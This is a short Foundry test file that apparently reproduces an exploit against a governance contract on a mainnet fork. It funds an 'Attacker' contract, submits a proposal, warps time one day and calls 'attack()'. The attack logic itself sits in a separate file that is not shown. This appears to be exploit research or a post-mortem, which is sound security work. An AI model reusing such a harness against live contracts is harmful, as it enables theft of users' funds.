// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/vun.sol";

contract VunTest is Test {
    Attacker public attacker;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth", 14595905);
        vm.deal(address(this), 70 ether);
        attacker = new Attacker();
    }

    function testAttack() public {
 
       attacker.proposeBip{value: 70 ether}();
 
       console.log("Proposal created, warping, %", block.timestamp);
       vm.warp(block.timestamp + 1 days);  // travelling 1 day in the future
       console.log("Warped, %s", block.timestamp);
      
       attacker.attack();
   }
}